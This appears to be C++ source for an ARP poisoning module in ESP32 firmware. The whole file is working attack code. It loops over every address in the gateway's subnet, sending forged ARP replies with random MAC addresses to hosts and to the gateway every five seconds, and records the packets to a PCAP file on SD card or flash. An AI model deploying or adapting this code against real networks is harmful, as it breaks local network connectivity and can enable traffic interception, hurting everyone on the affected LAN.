/**
 * @file ARPPoisoner.cpp
 * @brief ARP Poisoner module for every esp-netif
 * @version 0.1
 * @date 2025-05-15
 */
#if !defined(LITE_VERSION)
#include "ARPoisoner.h"
#include "Arduino.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/net_utils.h"
#include "core/utils.h"
#include "core/wifi/wifi_common.h"
#include "lwip/pbuf.h"
#include "lwipopts.h"
#include "modules/ethernet/eth_arp_utils.h"
#include <esp_wifi.h>
#include <globals.h>
#include <iomanip>
#include <iostream>
#include <lwip/dns.h>
#include <lwip/err.h>
#include <lwip/etharp.h>
#include <lwip/igmp.h>
#include <lwip/inet.h>
#include <lwip/init.h>
#include <lwip/ip_addr.h>
#include <lwip/mem.h>
#include <lwip/memp.h>
#include <lwip/netif.h>
#include <lwip/sockets.h>
#include <lwip/sys.h>
#include <lwip/timeouts.h>

ARPoisoner::ARPoisoner(IPAddress gateway) { setup(gateway); }

ARPoisoner::~ARPoisoner() {}

bool ARPoisoner::arpPCAPfile() {
    static int nf = 0;
    FS *fs;
    if (setupSdCard()) fs = &SD;
    else { fs = &LittleFS; }
    if (!fs->exists("/BrucePCAP")) fs->mkdir("/BrucePCAP");
    while (fs->exists(String("/BrucePCAP/ARP_session_" + String(nf++) + ".pcap").c_str())) yield();
    pcapFile = fs->open(String("/BrucePCAP/ARP_session_" + String(nf) + ".pcap").c_str(), FILE_WRITE);
    if (pcapFile) return true;
    else return false;
}

void ARPoisoner::setup(IPAddress gateway) {
    if (!arpPCAPfile()) Serial.println("Fail creating ARP Pcap file");

    for (int i = 0; i < 6; i++) {
        gatewayMAC[i] = random(256);
        victimMAC[i] = random(256);
    }
    for (int i = 0; i < 4; i++) {
        gatewayIP[i] = gateway[i];
        victimIP[i] = gateway[i];
    }
    long tmp = 0;
    drawMainBorderWithTitle("ARP Poisoning");
    padprintln("");
    padprintln("Sending ARP msg to all hosts");
    padprintln("");

    padprintln("Press Any key to STOP.");

    loop();
}

void ARPoisoner::loop() {
    long tmp = 0;
    while (!check(AnyKeyPress)) {
        if (tmp + 5000 < millis()) { // sends frames every 5 seconds
            for (int i = 0; i < 6; i++) {
                gatewayMAC[i] = random(256); // Create other random MAC to the Gateway
            }

            for (int i = 1; i < 255; i++) {
                if (AnyKeyPress) break;
                victimIP[3] = i;
                for (int i = 0; i < 6; i++) {
                    victimMAC[i] = random(256); // Create random MAC to all hosts
                }

                // Sends random Gateway MAC to all devices in the network
                sendARPPacket(victimIP, victimMAC, gatewayIP, gatewayMAC, pcapFile);

                // Sends Device random MACs back to gateway
                sendARPPacket(gatewayIP, gatewayMAC, victimIP, victimMAC, pcapFile);

                delay(10);
                tft.drawRightString(
                    "   " + String(victimIP[0]) + "." + String(victimIP[1]) + "." + String(victimIP[2]) +
                        "." + String(i),
                    tftWidth - 12,
                    tftHeight - 16,
                    1
                );
            }
            tmp = millis();
            tft.drawRightString("     Waiting...", tftWidth - 12, tftHeight - 16, 1);
        }
    }
    pcapFile.close();
}

void ARPoisoner::sendARPPacket(
    uint8_t *targetIP, uint8_t *targetMAC, uint8_t *spoofedIP, uint8_t *spoofedMAC, File pcapFile
) {
    ::sendARPPacket(targetIP, targetMAC, spoofedIP, spoofedMAC, pcapFile, "Pacote ARP enviado!");
}
#endif
